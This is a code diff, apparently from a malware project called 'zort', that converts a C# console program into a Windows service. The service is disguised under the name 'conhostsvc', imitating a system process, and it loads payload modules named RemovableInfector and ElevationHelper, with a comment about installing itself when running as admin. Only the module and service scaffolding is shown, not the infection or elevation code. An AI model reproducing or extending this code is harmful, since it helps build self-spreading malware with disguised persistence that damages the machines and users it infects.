@@ -1,28 +1,52 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Linq;
-using System.Runtime.InteropServices;
-using System.Text;
+using System.ServiceProcess;
 using System.Threading.Tasks;
 
 namespace zort
 {
-    class Program
+    class Program : ServiceBase
     {
-        static void Main(string[] args) // Change Main to async Task
+        List<IPayloadModule> modules = new List<IPayloadModule>
+                {
+                    new RemovableInfector(),
+                    new ElevationHelper()
+                };
+
+        public Program()
         {
-            InitModules();
-            Console.ReadLine();
+            ServiceName = "conhostsvc";
         }
 
-        static void InitModules()
+        static async Task Main(string[] args)
         {
-            List<IPayloadModule> modules = new List<IPayloadModule>
-            {
-                new RemovableInfector(),
-                new ElevationHelper()
-            };
+            //if is admin install and start service else just init modules normally
 
+        }
+
+        protected override void OnStart(string[] args)
+        {
+            base.OnStart(args);
+            InitModules();
+        }
+
+        protected override void OnStop()
+        {
+            StopModules();
+            base.OnStop();
+        }
+
+        private void StopModules()
+        {
+            modules.ForEach(m =>
+            {
+                Console.WriteLine($"Stopping module {m.ModuleName}");
+                m.Stop();
+            });
+        }
+
+        private void InitModules()
+        {
             bool isAdmin = ElevationHelper.IsElevated();
             modules.ForEach(m =>
             {
